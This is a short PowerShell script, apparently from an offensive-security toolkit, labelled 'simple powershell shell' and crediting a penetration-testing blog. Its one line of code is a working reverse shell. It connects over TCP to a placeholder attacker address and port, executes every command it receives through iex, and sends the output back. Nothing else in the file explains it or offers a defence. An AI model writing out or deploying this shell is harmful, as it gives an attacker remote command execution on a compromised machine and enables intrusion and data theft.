# simple powershell shell | Author: r00t-3xp10it
# Credits: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
# ---
$sm=(New-Object Net.Sockets.TCPClient("IpAdDr",P0rT)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
